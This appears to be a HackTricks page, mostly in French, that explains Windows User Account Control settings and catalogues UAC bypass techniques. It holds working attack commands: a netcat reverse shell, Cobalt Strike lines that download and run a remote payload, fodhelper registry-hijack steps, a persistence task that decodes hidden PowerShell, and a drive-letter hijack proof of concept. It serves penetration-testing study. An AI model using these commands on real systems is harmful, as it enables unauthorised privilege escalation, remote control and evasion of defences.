# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **invite de consentement pour les actions nécessitant une élévation**. Les applications ont différents niveaux d'`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque UAC est activé, les applications et les tâches s'exécutent toujours **dans le contexte de sécurité d'un compte non-administrateur** sauf si un administrateur autorise explicitement ces applications/tâches à disposer d'un accès de niveau administrateur pour s'exécuter. C'est une fonctionnalité de confort qui protège les administrateurs contre des modifications involontaires, mais ce n'est pas considérée comme une frontière de sécurité.

Pour plus d'infos sur les niveaux d'integrity :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsqu'UAC est en place, un utilisateur administrateur se voit attribuer deux jetons : un jeton d'utilisateur standard, pour effectuer les actions régulières au niveau standard, et un jeton avec les privilèges administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en profondeur le fonctionnement de UAC et couvre le processus de connexion, l'expérience utilisateur et l'architecture de UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le comportement de l'UAC spécifique à leur organisation au niveau local (en utilisant secpol.msc), ou les configurer et les déployer via des Group Policy Objects (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont décrits en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il y a 10 paramètres de stratégie de groupe qui peuvent être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                  | Registry Key                | Valeur par défaut                                           |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ----------------------------------------------------------- |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Désactivé)                                            |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Invite de consentement pour les binaires non-Windows sur le bureau sécurisé) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Invite de saisie des identifiants sur le bureau sécurisé)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Activé ; désactivé par défaut sur les éditions Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Désactivé)                                            |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Activé)                                               |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Activé)                                               |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Désactivé)                                            |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Activé)                                               |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Activé)                                               |

### Politiques d'installation de logiciels sur Windows

Les **stratégies de sécurité locales** ("secpol.msc" sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non-admin d'installer des logiciels**. Cela signifie que même si un utilisateur non-admin peut télécharger l'installateur de votre logiciel, il ne pourra pas l'exécuter sans un compte administrateur.

### Clés de registre pour forcer UAC à demander une élévation

En tant qu'utilisateur standard sans droits admin, vous pouvez faire en sorte que le compte "standard" soit **invité à fournir des identifiants par UAC** lorsqu'il tente d'effectuer certaines actions. Cette action nécessite la modification de certaines **clés de registre**, pour lesquelles il faut des permissions administratives, à moins qu'il n'existe un **UAC bypass**, ou que l'attaquant soit déjà connecté en tant qu'admin.

Même si l'utilisateur fait partie du groupe **Administrators**, ces modifications obligent l'utilisateur à **ressaisir les identifiants de son compte** pour effectuer des actions administratives.

**Le seul inconvénient est que cette approche nécessite que l'UAC soit désactivé pour fonctionner, ce qui est peu probable dans des environnements de production.**

Les clés et entrées de registre que vous devez modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut également être fait manuellement via l'outil Local Security Policy. Une fois modifié, les opérations administratives invitent l'utilisateur à ressaisir ses identifiants.

### Remarque

**User Account Control n'est pas une frontière de sécurité.** Par conséquent, les utilisateurs standard ne peuvent pas s'échapper de leur compte et obtenir des droits d'administrateur sans un local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilèges UAC

- Internet Explorer Protected Mode utilise des vérifications d'intégrité pour empêcher les processus de haut niveau d'intégrité (comme les navigateurs web) d'accéder aux données de bas niveau d'intégrité (comme le dossier des fichiers Internet temporaires). Cela se fait en exécutant le navigateur avec un low-integrity token. Lorsque le navigateur tente d'accéder à des données stockées dans la low-integrity zone, le système d'exploitation vérifie le niveau d'intégrité du processus et autorise l'accès en conséquence. Cette fonctionnalité aide à empêcher que des attaques d'exécution de code à distance n'accèdent à des données sensibles sur le système.
- Lorsqu'un utilisateur se connecte à Windows, le système crée un access token qui contient une liste des privilèges de l'utilisateur. Les privilèges sont définis comme la combinaison des droits et capacités d'un utilisateur. Le token contient également une liste des identifiants de l'utilisateur, qui sont utilisés pour authentifier l'utilisateur sur l'ordinateur et auprès des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin de se connecter automatiquement avec un utilisateur spécifique au démarrage, définissez la **clé de registre `AutoAdminLogon`**. Ceci est utile pour des environnements kiosk ou pour des tests. N'utilisez ceci que sur des systèmes sécurisés, car cela expose le mot de passe dans le registre.

Définissez les clés suivantes à l'aide de l'Éditeur du Registre ou de `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour revenir au comportement de connexion normal, réglez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

Le UAC bypass est nécessaire dans la situation suivante : **le UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyenne, et votre utilisateur appartient au groupe Administrators**.

Il est important de mentionner qu'il est **beaucoup plus difficile de contourner le UAC si celui-ci est au niveau de sécurité le plus élevé (Always) que s'il est à l'un des autres niveaux (Default).**

### UAC disabled

Si le UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**) vous pouvez **exécuter un reverse shell avec les privilèges administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** basique UAC "bypass" (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrators, vous pouvez **monter le partage C$** via SMB en tant que nouveau lecteur local et vous aurez **accès à tout le contenu du système de fichiers** (même le dossier personnel d'Administrator).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Les techniques Cobalt Strike ne fonctionneront que si UAC n'est pas réglé au niveau de sécurité maximal.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **bypass** le **UAC**.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs UAC bypass exploits. Notez que vous devrez **compile UACME using visual studio or msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous devez utiliser.**\
Vous devez **être prudent** car certains bypasses vont **faire apparaître des dialogues d'autres programmes** qui vont **alerter** l'**utilisateur** que quelque chose est en cours.

UACME fournit la **version de build à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [this](https://en.wikipedia.org/wiki/Windows_10_version_history) vous obtenez la version Windows `1607` à partir des numéros de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est automatiquement élevé sur les versions récentes de Windows. Lors de son lancement, il interroge le chemin de registre par utilisateur ci‑dessous sans valider le verbe `DelegateExecute`. Placer une commande à cet emplacement permet à un processus Medium Integrity (l'utilisateur appartient au groupe Administrators) de lancer un processus High Integrity sans déclencher la boîte de dialogue UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Remarques :
- Fonctionne lorsque l'utilisateur courant est membre du groupe Administrators et que le niveau UAC est par défaut/permissif (pas Always Notify avec restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour lancer un PowerShell 64 bits depuis un processus 32 bits sur un Windows 64 bits.
- Le payload peut être n'importe quelle commande (PowerShell, cmd, ou un chemin vers un EXE). Évitez les UIs avec des invites pour rester discret.

#### Variante CurVer/extension hijack (seulement HKCU)

Des échantillons récents abusant de `fodhelper.exe` évitent `DelegateExecute` et **redirigent le ProgID `ms-settings`** via la valeur `CurVer` par utilisateur. Le binaire auto-élevé résout toujours le gestionnaire sous `HKCU`, donc aucun token admin n'est nécessaire pour créer les clés :
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois élevé, le malware **désactive les futures invites** en réglant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectue des techniques supplémentaires de defense evasion (par ex., `Add-MpPreference -ExclusionPath C:\ProgramData`) et recrée la persistence pour s'exécuter en high integrity. Une tâche de persistence typique stocke un **XOR-encrypted PowerShell script** sur disque et le décode/exécute en mémoire chaque heure :
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante efface toujours le dropper et ne laisse que les payloads mis en scène, rendant la détection dépendante de la surveillance du **`CurVer` hijack**, de la modification de `ConsentPromptBehaviorAdmin`, de la création d'exclusions Defender, ou des tâches planifiées qui décryptent PowerShell en mémoire.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **processus** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

Si vous avez accès à une **GUI** vous pouvez simplement accepter l'UAC quand il apparaît, vous n'avez pas vraiment besoin d'un bypass. Ainsi, obtenir l'accès à une GUI vous permettra de bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Lisez ceci pour apprendre comment trouver une vulnérabilité de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui **autoelevate** (vérifiez que lorsqu'il est exécuté il tourne avec un niveau d'intégrité élevé).
2. Avec procmon trouvez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous devrez probablement **write** la DLL dans certains **protected paths** (comme C:\Windows\System32) où vous n'avez pas les permissions d'écriture. Vous pouvez contourner cela en utilisant:
1. **wusa.exe**: Windows 7,8 and 8.1. Il permet d'extraire le contenu d'un fichier CAB dans des protected paths (car cet outil est exécuté au niveau d'intégrité élevé).
2. **IFileOperation**: Windows 10.
4. Préparez un **script** pour copier votre DLL dans le protected path et exécuter le binaire vulnérable et autoelevated.

### Another UAC bypass technique

Consiste à surveiller si un **autoElevated binary** essaie de **read** depuis le **registry** le **name/path** d'un **binary** ou d'une **command** à **executed** (c'est plus intéressant si le binary recherche cette information dans le **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” utilise des shadow-admin tokens avec des maps `\Sessions\0\DosDevices/<LUID>` par session. Le répertoire est créé paresseusement par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l'attaquant usurpe le shadow-admin token uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l'attaquant comme **owner** (hérite de `CREATOR OWNER`), permettant des liens de lettre de lecteur qui priment sur `\GLOBAL??`.

**Steps:**

1. Depuis une session à faibles privilèges, appelez `RAiProcessRunOnce` pour spawn un promptless shadow-admin `runonce.exe`.
2. Dupliquez son token primaire en un token d'**identification** et impersonnez‑le en ouvrant `\??` pour forcer la création de `\Sessions\0\DosDevices/<LUID>` sous la propriété de l'attaquant.
3. Créez un symlink `C:` là‑dedans pointant vers un stockage contrôlé par l'attaquant ; les accès au système de fichiers ultérieurs dans cette session résoudront `C:` vers le chemin de l'attaquant, permettant un DLL/file hijack sans invite.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Références
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
